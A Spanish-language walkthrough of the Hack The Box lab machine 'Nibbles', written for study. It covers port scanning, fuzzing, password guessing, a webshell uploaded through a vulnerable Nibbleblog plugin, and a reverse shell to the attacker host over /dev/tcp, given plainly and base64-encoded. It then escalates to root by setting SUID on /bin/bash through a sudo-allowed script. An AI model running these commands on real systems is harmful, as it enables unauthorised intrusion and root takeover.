---
title: Nibbles
published: true
categories: [Linux, Easy] 
tags: [Web explotation, File upload, SUDO abuse]
author: Kripteria
image:
  path: https://user-images.githubusercontent.com/55555187/187722862-aa7846f4-2880-498d-9f3c-6e57510d3b1f.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Nibbles es una <font color="#98E256">máquina Easy</font> de temática <font color="#D35400">Linux</font> en la que se toca enumeración y fuzzing de servicios web, password guessing, insecure file upload y abuso del permiso sudo.

## Reconocimiento y explotación

```bash
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv -oG portScan 10.10.10.75
```

<img title="" src="https://user-images.githubusercontent.com/55555187/187641013-3553bc67-0394-4f54-aa2c-34b1e101aec4.png" alt="image" width="387">

```bash
nmap -sVC -p22,80 -oN portSV 10.10.10.75
```

<img src="https://user-images.githubusercontent.com/55555187/187641427-94e13712-73ac-4143-938e-5e718dbe8bc3.png" title="" alt="image" width="525">

Revisando el contenido de la web del puerto 80 encuentro un "*Hello world!*", reviso el código fuente de la web y encuentro un comentario indicandome que en */nibbleblog/* está el contenido real.

![image](https://user-images.githubusercontent.com/55555187/187641334-3b16bc9d-c177-4cbb-9f7c-f94f77713e37.png)

A simple vista no consigo ver nada relevante, hay 3 peticiones *GET* con parámetros los cuales compruebo si son vulnerables a *SQLi* (no lo son) y también encuentro un *feed.php* que no tiene nada útil.

Fuzzeo la web con *wfuzz* y encuentro una serie de directorios interesantes:

```bash
wfuzz -c --hc=404 -t 200 -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ
```

<img src="https://user-images.githubusercontent.com/55555187/187642908-2a369a67-139b-413d-9a53-36db7c455a91.png" title="" alt="image" width="589">

Revisando el *README* encuentro la versión del software, mirando en *searchsploit* encuentro que es vulnerable a *insecure file upload* debido a que el plugin *my_image* (que viene por defecto) no comprueba las extensiones de los archivos:

![image](https://user-images.githubusercontent.com/55555187/187643248-bd2c5390-769f-490f-bb5d-34d977b01c0b.png)

![image](https://user-images.githubusercontent.com/55555187/187643302-205e9392-d99d-4a3d-858e-5b9e8bab1b75.png)

Revisando el exploit veo que requiere credenciales válidas, como que de momento no tengo.

Otra cosa relevante es que en */content/private/users.xml* se puede ver que existe el usuario *admin* y que hay un sistema de blacklist en el login:

<img title="" src="https://user-images.githubusercontent.com/55555187/187645276-6c66a43e-1de9-4d3c-8ab3-fea0ad29d424.png" alt="image" width="484">  

Como no veo nada más de utilidad, lanzo otro fuzzing pero esta vez indicandole que quiero que busque archivos *.PHP* ya que si ponemos */feed* sin la extensión, nos devuelve un *404* por lo que la extensión es importante.

```bash
wfuzz -c --hc=404 -t 200 -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php
```

Encuentro el panel de login de administración en */admin.php* y tras revisar bastante llego a la conclusión de que tengo que hacer guessing de la contraseña. Probando con diversas variaciones del nombre de la web obtengo credenciales válidas:

```tex
admin:nibbles
```

Me logueo, busco el plugin *My Image*, subo una *webshell* y la exploto bajo el directorio */content/private/plugins/my_image/image.php*:

<img src="https://user-images.githubusercontent.com/55555187/187650798-683be153-90cc-4ad0-ba5d-b20e974fe4e1.png" title="" alt="image" width="568">

<img src="https://user-images.githubusercontent.com/55555187/187650998-1fca3284-2ab6-47f5-901d-02e519be6937.png" title="" alt="image" width="529">

Contenido de la *webshell*:

<img title="" src="https://user-images.githubusercontent.com/55555187/187651842-cf925a98-bfd2-49f9-ae5f-bb82540a20fd.png" alt="image" width="377">

<img src="https://user-images.githubusercontent.com/55555187/187651766-38cc8f99-b7b5-4ce4-ae70-555d6d503030.png" title="" alt="image" width="469">

Una vez que sé que puedo ejecutar comandos, miro si *netcat* está instalado y si tiene la opción *-e* habilitada, cosa que no es así:

![image](https://user-images.githubusercontent.com/55555187/187652030-28c27fe3-3284-4371-a27b-91b88d931676.png)

En este caso decido optar por entablarme una reverse shell haciendo uso del siguiente comando:

```bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
```

El cual *base64* encodeo y lanzo al servidor de la siguiente forma:

```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MyAwPiYxCg==' | base64 -d | bash
```

![image](https://user-images.githubusercontent.com/55555187/187652854-d96352c0-a91f-43a7-b3bd-530044a09904.png)

Lo que ha pasado es que el servidor ha descifrado la cadena de texto en *base64* y luego la ha pipeado a una *bash* haciendo que el comando se interprete.

## Escalada de privilegios

Una vez dentro de la máquina, compruebo si puedo ejecutar *sudo *en algún contexto y descubro que sí, que puedo ejecutar el archivo *monitor.sh* como root sin proporcionar credenciales:

<img src="https://user-images.githubusercontent.com/55555187/187653107-c7031100-ad93-4bb7-b282-ed3aa67bfd72.png" title="" alt="image" width="583">

Como tengo pleno acceso al archivo, creo un nuevo archivo *monitor.sh* que ejecuta el siguiente comando:

<img title="" src="https://user-images.githubusercontent.com/55555187/187653655-f580f23b-2f0f-4cc6-8a29-63227d79bd3b.png" alt="image" width="529">

```bash
chmod 4731 '/bin/bash'
```

Con ese comando lo que hago es darle permisos *SUID* a */bin/bash* como el usuario *root* lo que hace que pueda ejecutar *bash -p* como cualquier usuario logrando convertirme en root:

<img title="" src="https://user-images.githubusercontent.com/55555187/187656513-9c0919ff-1508-43d0-a04a-f2d243af67d4.png" alt="image" width="520">
